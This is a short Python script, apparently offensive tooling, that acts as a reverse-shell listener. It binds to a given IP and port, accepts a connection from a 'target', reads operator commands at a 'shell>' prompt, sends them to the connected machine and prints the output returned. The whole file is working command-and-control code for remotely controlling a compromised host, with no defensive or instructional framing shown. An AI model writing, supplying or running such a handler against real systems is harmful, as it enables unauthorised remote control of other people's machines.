import socket
import sys

def start_listener(ip, port):
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Bind the socket to the IP and port
        s.bind((ip, port))
        
        # Listen for incoming connections
        s.listen(5)
        print(f"[*] Listening on {ip}:{port}")
        
        # Accept a connection
        client_socket, client_address = s.accept()
        print(f"[+] Connection established from {client_address}")
        
        # Handle the connection
        while True:
            try:
                # Receive data from the target
                command = input("shell> ")
                if command.lower() in ["exit", "quit"]:
                    break
                
                # Send the command to the target
                client_socket.send(command.encode())
                
                # Receive the output from the target
                output = client_socket.recv(4096).decode()
                print(output)
            except KeyboardInterrupt:
                print("\n[*] Closing connection...")
                break
            except ConnectionResetError:
                print("[!] Connection reset by peer. Target may have disconnected.")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                break
        
        # Close the connection
        client_socket.close()
        s.close()
        print("[*] Connection closed.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <LISTEN_IP> <LISTEN_PORT>")
        sys.exit(1)
    
    listen_ip = sys.argv[1]
    listen_port = int(sys.argv[2])
    
    start_listener(listen_ip, listen_port)
